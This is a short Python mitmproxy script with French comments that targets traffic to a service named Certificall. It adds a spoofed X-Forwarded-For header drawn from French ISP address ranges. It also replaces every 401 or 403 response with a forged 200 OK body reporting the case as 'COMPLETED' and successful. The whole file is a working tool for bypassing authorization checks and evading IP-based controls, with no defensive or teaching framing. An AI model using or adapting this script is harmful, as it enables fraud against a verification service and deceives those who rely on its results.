"""
MITM Proxy Script — Intercepte le trafic Certificall.
- Modifie les reponses 401/403 en 200 OK
- Ajoute une IP aleatoire dans X-Forwarded-For a chaque requete
"""

import json
import random
from mitmproxy import http, ctx


def _random_french_ip():
    """Genere une IP aleatoire dans des plages francaises courantes."""
    ranges = [
        (86, 192, 255),    # Free
        (90, 0, 255),      # Free
        (78, 192, 255),    # SFR
        (92, 128, 255),    # SFR
        (176, 128, 191),   # OVH Mobile
        (109, 0, 63),      # Bouygues
        (82, 64, 127),     # Orange
        (83, 112, 127),    # Orange
        (88, 0, 63),       # Orange
        (2, 0, 15),        # Orange
    ]
    first, low, high = random.choice(ranges)
    return f"{first}.{random.randint(low, high)}.{random.randint(1, 254)}.{random.randint(1, 254)}"


# IP fixe pour la session (change a chaque redemarrage du proxy)
SESSION_IP = _random_french_ip()


def request(flow: http.HTTPFlow) -> None:
    host = flow.request.pretty_host.lower()
    if "certificall" not in host:
        return

    # Ajouter/remplacer X-Forwarded-For avec une IP aleatoire
    flow.request.headers["X-Forwarded-For"] = SESSION_IP
    ctx.log.warn(f"[REQ] {flow.request.method} {flow.request.path} (IP: {SESSION_IP})")


def response(flow: http.HTTPFlow) -> None:
    host = flow.request.pretty_host.lower()
    if "certificall" not in host:
        return

    status = flow.response.status_code
    path = flow.request.path
    method = flow.request.method

    ctx.log.warn(f"[RESP] {status} {method} {path}")

    if status in (401, 403):
        try:
            body = flow.response.content.decode("utf-8", errors="ignore")[:500]
        except Exception:
            body = ""

        ctx.log.error(f"[BYPASS] {status} -> 200 | {method} {path}")

        fake_body = {
            "id": 999,
            "caseId": 1,
            "status": "COMPLETED",
            "success": True,
            "message": "OK"
        }

        flow.response.status_code = 200
        flow.response.headers["content-type"] = "application/json"
        flow.response.content = json.dumps(fake_body).encode()

    elif status >= 400:
        ctx.log.error(f"[ERROR] {status} {method} {path}")
